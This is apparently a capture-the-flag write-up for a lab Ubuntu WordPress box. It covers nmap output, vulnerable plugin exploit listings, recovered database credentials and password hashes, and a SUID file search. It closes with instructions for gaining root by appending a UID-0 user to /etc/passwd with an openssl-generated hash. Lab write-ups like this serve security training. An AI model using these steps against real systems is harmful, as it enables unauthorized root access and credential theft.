# NMAP

```bash
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

# web

## /info.php
```
192.168.239.23
```

## Wordpress

USERS:-

![image](https://user-images.githubusercontent.com/68326057/117093491-be974000-ad7e-11eb-8b55-ccf7c731b9dc.png)

```bash
admin
aarti
```

wp-support-plus-responsive-ticket-system:-

![image](https://user-images.githubusercontent.com/68326057/117093503-c8b93e80-ad7e-11eb-8cf3-eda1aa18fb2d.png)

```bash
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation               | php/webapps/41006.txt
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection                      | php/webapps/40939.txt
```

slideshow-gallery:-

![image](https://user-images.githubusercontent.com/68326057/117093518-d1aa1000-ad7e-11eb-85e0-04c7234300b1.png)

```bash
WordPress Plugin Slideshow Gallery 1.4.6 - Arbitrary File Upload                                     | php/webapps/34514.txt
WordPress Plugin Slideshow Gallery 1.4.6 - Arbitrary File Upload (Python)                            | php/webapps/34681.txt
```

reflex-gallery:- 

![image](https://user-images.githubusercontent.com/68326057/117093533-d8d11e00-ad7e-11eb-8657-677157d19dd8.png)

```bash
WordPress Plugin Reflex Gallery - Arbitrary File Upload (Metasploit)                                 | php/remote/36809.rb
WordPress Plugin Reflex Gallery 3.1.3 - Arbitrary File Upload                                        | php/webapps/36374.txt
```

![image](https://user-images.githubusercontent.com/68326057/117095127-251e5d00-ad83-11eb-8122-955542275b9b.png)


# User- WwwData

![image](https://user-images.githubusercontent.com/68326057/117095168-42ebc200-ad83-11eb-8087-5b94be2c7ef2.png)


![image](https://user-images.githubusercontent.com/68326057/117095263-85ad9a00-ad83-11eb-9a67-52f49f4e3f7e.png)

```bash
raj:123  -> mysql                                                                                                       
```

```bash
root:x:0:0:root:/root:/bin/bash
raj:x:1000:1000:raj,,,:/home/raj:/bin/bash
hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash
```
![image](https://user-images.githubusercontent.com/68326057/117095462-15ebdf00-ad84-11eb-84a3-407d6340ab59.png)

```sql
  1 | admin      | $P$BYWgfD7pa572QS9YFoeVVmhrIhBAx0. | admin         | abc@gmail.com   |   
  3 | aarti      | $P$BHyn.q5e5/HG9/UT/Ow3xkH2xXsikx0 | aarti         | aarti@gmail.com |  
```

```bash
www-data@ubuntu:/var/www/html/wordpress$ find / -perm -u=s -type f 2>/dev/null                                                         
<ml/wordpress$ find / -perm -u=s -type f 2>/dev/null                                                                                   
/usr/bin/pkexec                                                                                                                        
/usr/bin/wget                                                                                                                          
/bin/cp 
```

```bash
cat /etc/passwd 

append this in /etc/passwd :-
wraith:(paste here):0:0:root:/root:/bin/bash

On attacker Machine:-
openssl passwd (your password)

then paste the value in paste here
```

# root

![image](https://user-images.githubusercontent.com/68326057/117096556-1c2f8a80-ad87-11eb-9db6-2b998787a1fd.png)
